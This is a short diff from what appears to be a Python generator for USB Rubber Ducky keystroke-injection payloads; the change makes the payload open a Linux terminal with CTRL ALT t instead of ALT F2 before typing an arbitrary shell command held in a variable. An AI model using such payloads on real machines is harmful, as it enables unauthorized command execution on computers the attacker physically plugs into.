@@ -29,7 +29,7 @@ class payload:
 		payload_save_path = "payloads/rubber_duck/payload.txt"
 		payload = """\
 DELAY 10
-ALT F2
+CTRL ALT t
 DELAY 10
 STRING """+shell_command+"""
 DELAY 100
